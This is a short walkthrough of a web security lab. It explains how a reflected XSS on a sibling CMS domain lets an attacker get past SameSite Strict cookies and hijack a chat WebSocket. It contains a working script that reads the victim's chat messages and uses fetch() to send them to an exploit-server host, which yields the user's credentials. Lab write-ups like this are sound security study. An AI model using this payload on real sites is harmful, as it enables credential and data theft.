# SameSite Strict bypass via sibling domain.html
So, a little enumeration shows that the application doesn't have much other interesting functionality than login and live chat. Our goal is to exfiltrate the login information for a user, and we are told, that it is in the chat history of the victim.
The fact that the website doesn't have much indicates that we need to do deeper enumeration.
While inspecting the site map in burp, the server sets `Access-Control-Allow-Origin: https://cms-0a1800cf033fe33080870de4003e00ee.web-security-academy.net` header. This is really intersting. Going on the site reveals a login page.
Since the goal is CSWSH, I searched for XXS. Sending `<script>alert(1)</script>` made an alert. This means that we need to inject a script that makes a socket, which will pass the `SameSite: strict` which is set. Then the script needs to exfiltrate the data.
This is the script tag I wrote:
```html
    <script>
        const s = new WebSocket("https://0a1800cf033fe33080870de4003e00ee.web-security-academy.net/chat");  
        s.onopen = function() {
            s.send("READY");
        };
        s.onmessage = function(event) {
            if(d = JSON.parse(event.data)) {
                fetch('https://exploit-0a080026032be3cb804c0c1a012600f6.exploit-server.net/exploit?data=' + encodeURIComponent(d['content']));
            }
        };
    </script>
```
Now, we need to craft a malicious website, which will make the victim submit the script to the vulnerable login page. The exploit can be seen here:
[Soltion html](./assets/SameSite%20Strict%20bypass%20via%20sibling%20domain.html)
Looking at the logs, the credentials for Carlos has been sent. We use them to login and solve the lab.